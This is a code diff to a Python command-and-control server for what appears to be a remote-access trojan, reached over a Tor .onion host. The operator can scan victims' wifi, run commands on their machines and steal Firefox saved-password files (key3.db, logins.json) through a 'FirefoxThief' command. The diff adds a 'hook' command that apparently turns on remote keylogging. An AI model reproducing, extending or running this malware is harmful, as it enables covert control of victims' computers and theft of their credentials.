@@ -4,14 +4,17 @@ from subprocess import Popen, PIPE, STDOUT, check_output
 from clint.textui import colored
 from tqdm import tqdm
 
+# host = T-master host
 host = 'hcjczulezpxxfw2n.onion'
 hasher = hashlib.sha256()
+# loading geoip2
 try:
     reader = geoip2.database.Reader('/home/user/Scaricati/GeoLite2-City.mmdb')
 except:
     print ("Can not load GEOIP2-Database")
 
-pid1 = subprocess.Popen(args=["xterm","-e","python net.py"]).pid
+# init
+#pid1 = subprocess.Popen(args=["xterm","-e","python net.py"]).pid
 
 print ("%s---------------------------%s" % (fg(46), attr(0)))
 print ("%s[Starting server]%s" % (fg(46), attr(0)))
@@ -132,11 +135,13 @@ while True:
             elif inText.startswith("!"):
 		        ExecIN(inText.split("!")[1])
             elif inText.startswith('s-wifi'):
+                SendData("get-inferfaces")
+                print (("%s"+RecvData()+"%s") % (fg(6),attr(0)))
                 card = raw_input("[*] Enter wifi card name: ")
                 SendData("ScanWIFI :" + card)
                 report = RecvData()
                 while report != "ScanWIFI-finished":
-                    print ("|--- " + report)
+                    print (("%s|--- " + report+"%s") % (fg(6),attr(0)))
                     report = RecvData()
             elif inText == "info":
                 SendData("info")
@@ -154,7 +159,11 @@ while True:
             elif inText == "terminate":
                 SendData("terminate")
                 print (("%s%s----[exit-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(9),attr(1),attr(0)))
-                connstream.shutdown(socket.SHUT_RDWR)
+                connstream.close()
+                break
+            elif inText == "killme":
+                SendData("terminate")
+                print (("%s%s----[exit-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(9),attr(1),attr(0)))
                 connstream.close()
                 break
             elif inText == "FirefoxThief":
@@ -170,7 +179,18 @@ while True:
                 DownloadFILE("key3.db")
                 DownloadFILE("logins.json")
                 print colored.green("Finished")
-
+            elif inText.startswith("hook"):
+                if inText.split(":")[1] == "":
+                    print "usage:\n" + "-- start --> hook:ON \n" + "-- check --> hook:check"
+                    print "-- stop --> hook:OFF\n"
+                    usage = raw_input()
+                    SendData(usage)
+                    retstat = RecvData()
+                    print colored.green("==> HOOK"+retstat)
+                else:
+                    SendData(inText)
+                    retstat = RecvData()
+                    print colored.green("==> HOOK: "+retstat)
             elif inText.startswith('protect'):
                     SendData(inText)
                     inText = RecvData()
